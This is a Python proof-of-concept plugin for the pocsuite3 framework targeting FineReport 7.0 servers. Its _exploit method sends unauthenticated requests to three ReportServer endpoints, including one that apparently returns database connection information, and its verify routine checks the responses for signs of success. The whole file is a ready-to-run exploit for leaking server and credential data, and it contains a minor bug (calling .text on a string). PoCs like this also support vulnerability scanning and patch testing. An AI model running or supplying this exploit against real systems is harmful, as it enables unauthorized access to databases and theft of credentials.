#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger,
    OptString, OrderedDict,
    random_str,
)
from urllib.parse import urljoin
import os
minimum_version_required('2.0.2')


class DemoPOC(POCBase):
    vulID = '0'
    version = '1'
    author = ''
    vulDate = '2023-03-27'
    createDate = '2023-03-27'
    updateDate = '2023-03-27'
    references = []
    name = 'FineReport_unauthorized_access.py'
    appPowerLink = ''
    appName = ''
    appVersion = '7.0'
    vulType = 'Information Disclosure'
    desc = 'Vulnerability description'
    samples = ['']
    install_requires = ['']
    pocDesc = 'User manual of poc'
    dork = {'zoomeye': ''}
    suricata_request = ''
    suricata_response = ''
    severity='high'

    def _exploit(self, param=''):
        log_url='/ReportServer?op=fr_server&cmd=sc_visitstatehtml&showtoolbar=false'
        privilege_reset_url='/ReportServer?op=fr_server&cmd=sc_version_info&showtoolbar=false'
        database_pass_url='/ReportServer?op=fr_server&cmd=sc_getconnectioninfo'

        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        response1 = requests.post(urljoin(self.url,log_url), headers=headers)
        response2 = requests.post(urljoin(self.url,privilege_reset_url), headers=headers)
        response3 = requests.post(urljoin(self.url,database_pass_url), headers=headers)
        res=response1.text+response2.text+response3.text
        logger.debug(res)
        return res

    def _verify(self):
        result = {}
        res = self._exploit()
        if "网络报表" in res or "导入服务器授权文件" in res or '{"name":"' in res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['info'] = {}
            result['VerifyInfo']['info']['Severity']=self.severity
            result['VerifyInfo']['info']['Result']=res.text
            result['VerifyInfo']['info']['file_name'] = os.path.basename(__file__)
        return self.parse_output(result)

    def _attack(self):
        result = {}
        param = self.get_option('param')
        res = self._exploit(param)
        result['VerifyInfo'] = {}
        result['VerifyInfo']['URL'] = self.url
        result['VerifyInfo'][param] = res
        return self.parse_output(result)

    def _shell(self):
        return self._verify()


register_poc(DemoPOC)
